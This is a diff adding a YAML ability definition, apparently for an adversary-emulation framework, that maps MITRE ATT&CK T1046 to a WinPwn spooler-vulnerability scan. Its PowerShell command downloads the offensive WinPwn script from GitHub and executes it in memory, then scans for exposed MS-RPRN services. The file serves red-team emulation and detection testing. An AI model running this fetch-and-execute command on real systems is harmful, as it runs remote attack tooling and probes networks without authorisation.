@@ -1,0 +1,17 @@
+- description: Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn
+  id: cd37d1ae-a723-197f-33f0-2c1cc8700704
+  name: WinPwn - spoolvulnscan
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          spoolvulnscan -noninteractive -consoleoutput
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1046
+    name: Network Service Discovery
